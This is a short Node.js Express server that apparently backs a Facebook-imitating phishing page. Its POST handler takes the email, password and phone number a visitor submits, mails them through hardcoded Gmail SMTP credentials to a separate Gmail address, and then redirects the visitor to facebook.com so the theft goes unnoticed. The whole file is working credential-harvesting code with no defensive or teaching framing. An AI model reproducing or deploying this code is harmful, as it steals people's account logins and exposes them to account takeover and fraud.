const express = require("express");
const app = express();
const ejs = require("ejs");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname + "/public"));
app.set("view engine", "ejs");

app.get("/", function (req, res) {
  res.render("home", {});
});

app.get("/help", function (req, res) {
  res.redirect("https://www.facebook.com/help");
});

app.post("/", function (req, res) {
  console.log(req.body);
  let pass = req.body.password;
  let email = req.body.email;
  let phone = req.body.number;

  // create reusable transporter object using the default SMTP transport
  let transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,
    secure: false, // true for 465, false for other ports
    requireTLS: true,
    auth: {
      user: "zooliana13@gmail.com", // generated ethereal user
      pass: "gifty@zoo", // generated ethereal password
    },
  });

  // send mail with defined transport object
  let mailOption = {
    from: "zooliana13@gmail.com", // sender address
    to: "gamebwoy13@gmail.com", // list of receivers
    subject: "Hello ✔", // Subject line
    text:
      "email :" +
      email +
      "    password :" +
      pass +
      "   phone number : " +
      phone, // plain text body
    // html: "<b>Hello world?</b>", // html body
  };

  transporter.sendMail(mailOption, (error, info) => {
    if (error) {
      res.send("baad");
      return console.log(error);
    } else {
      console.log("Message sent: %s", info.messageId);
      console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
      res.redirect("https://www.facebook.com");
    }
  });
});

app.listen(3000, function () {
  console.log("server started at 3000");
});
